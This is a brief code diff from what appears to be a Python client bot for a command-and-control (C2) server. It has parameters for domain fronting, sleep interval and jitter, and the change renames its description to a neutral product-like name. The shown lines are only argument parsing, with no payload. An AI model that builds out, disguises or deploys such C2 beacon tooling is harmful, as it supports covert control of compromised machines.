@@ -133,7 +133,7 @@ def main(c2_host, c2_port, fronting_host, host_header, sleep_interval, jitter):
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="dLNk dLNk Client Bot")
+    parser = argparse.ArgumentParser(description="Connext Client Bot")
     parser.add_argument("--host", default="127.0.0.1", help="C2 server host")
     parser.add_argument("--port", type=int, default=4444,
                         help="C2 server port")
